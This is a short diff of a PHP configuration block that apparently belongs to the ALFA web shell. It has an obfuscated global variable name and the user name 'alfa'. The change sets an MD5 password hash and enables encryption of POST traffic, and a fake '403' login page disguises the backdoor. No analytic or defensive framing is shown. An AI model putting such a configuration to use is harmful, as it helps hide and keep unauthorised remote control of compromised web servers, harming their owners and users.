@@ -8,11 +8,11 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => '',//md5()
+    'password' => 'a2bf01e7bc417f98e2f022b89b5a2737',//md5()
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
-    'post_encryption' => false,
+    'post_encryption' => true,
     'cgi_api' => true,
 );
 
